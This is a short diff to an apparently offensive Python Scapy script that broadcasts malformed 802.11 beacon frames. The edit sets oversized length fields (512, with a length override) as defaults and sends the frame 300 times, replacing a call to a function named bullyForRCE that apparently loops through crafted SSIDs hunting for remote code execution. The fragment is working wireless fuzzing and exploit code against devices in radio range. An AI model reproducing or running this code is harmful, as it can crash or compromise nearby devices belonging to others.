@@ -15,11 +15,11 @@ def sendProbe(SSID,
 	frame = RadioTap()/dot11/beacon/essid
 	sendp(frame, iface=iface, inter=interval, count=repeat)
 
-def sendProbeRaw(SSID,
-				 repeat=1,
-				 interval=0.200,
-				 listedLen=255,
-				 lenOverride=False):
+def sendProbeRaw(SSID='F',
+				 repeat=3,
+				 interval=0.150,
+				 listedLen=512,
+				 lenOverride=True):
 
 		dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=sender, addr3=sender)
 		beacon = Dot11Beacon()
@@ -125,5 +125,6 @@ def bullyForRCE(max=10000,
 		print(f"\nSending {i}/{max}\n\tWith SSID {urlEncoded}\n\tWith Length Of {listedLen}")
 		sendp(frame, iface=iface, inter=interval, count=repeat)
 
-bullyForRCE()
+sendProbeRaw(repeat=300)
+#bullyForRCE()
 #sendRandBytesBeacons(100, 20, 5, 0.1)
